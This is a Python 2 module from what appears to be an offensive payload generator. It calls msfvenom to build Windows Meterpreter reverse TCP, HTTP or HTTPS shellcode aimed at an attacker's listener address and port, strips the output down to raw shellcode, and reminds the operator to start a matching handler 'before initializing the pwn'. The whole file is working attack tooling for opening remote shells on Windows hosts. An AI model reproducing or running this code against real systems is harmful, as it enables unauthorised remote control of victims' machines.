# Import Modules
import commands
import sys
from modules.common import messages

# Generate Shellcode Via msfvenom
def genShellcode():

    # For some reason this module refuses to load higher up.
    # Someone please tell me why so I stop feeling like a nub.
    from modules.common import msfparams

    # Create our variable that reminds the user to setup their handler.
    global helpfulinfo

    if msfparams.ShellSrc == '2':
        helpfulinfo = "\n[!] Be sure to test your custom shellcode before initializing the pwn!"
        FuncShellcode = msfparams.CustomShell
        return FuncShellcode
    else:    

        # Handler-type If-statement
        if msfparams.Handler == "1":
            # Build our reverse tcp based payload
            helpfulinfo = "\n[!] Be sure to set up a Reverse TCP handler with the following settings:\n\n"
            helpfulinfo += " PAYLOAD = windows/meterpreter/reverse_tcp\n"
            helpfulinfo += " LHOST   = " + msfparams.LocalHost
            helpfulinfo += "\n LPORT   = " + msfparams.LocalPort
            print "[*] Generating shellcode..."
            MsfvenomCommand = "msfvenom -p windows/meterpreter/reverse_tcp LHOST="+msfparams.LocalHost+" LPORT="+msfparams.LocalPort+" -b \'\\x00\\x0a\\xff\' -f c | tr -d \'\"\' | tr -d \'\n\'"
        elif msfparams.Handler == "2":
            # Build our reverse http payload
            helpfulinfo = "\n[!] Be sure to set up a Reverse HTTP handler with the following settings:\n\n"
            helpfulinfo += " PAYLOAD = windows/meterpreter/reverse_http\n"
            helpfulinfo += " LHOST   = " + msfparams.LocalHost
            helpfulinfo += "\n LPORT   = " + msfparams.LocalPort
            print "[*] Generating shellcode..."
            MsfvenomCommand = "msfvenom -p windows/meterpreter/reverse_http LHOST="+msfparams.LocalHost+" LPORT="+msfparams.LocalPort+" -b \'\\x00\\x0a\\xff\' -f c | tr -d \'\"\' | tr -d \'\n\'"
        elif msfparams.Handler == "3":
            # Build our reverse https payload
            helpfulinfo = "\n[!] Be sure to set up a Reverse HTTPS handler with the following settings:\n\n"
            helpfulinfo += " PAYLOAD = windows/meterpreter/reverse_https\n"
            helpfulinfo += " LHOST   = " + msfparams.LocalHost
            helpfulinfo += "\n LPORT   = " + msfparams.LocalPort
            print "[*] Generating shellcode..."
            MsfvenomCommand = "msfvenom -p windows/meterpreter/reverse_https LHOST="+msfparams.LocalHost+" LPORT="+msfparams.LocalPort+" -b \'\\x00\\x0a\\xff\' -f c | tr -d \'\"\' | tr -d \'\n\'"

        # Stript out extra characters, new lines, etc., just leave the shellcode.
        FuncShellcode = commands.getoutput(MsfvenomCommand)
        FuncShellcode = FuncShellcode[82:-1]
        FuncShellcode = FuncShellcode.strip()
        return FuncShellcode
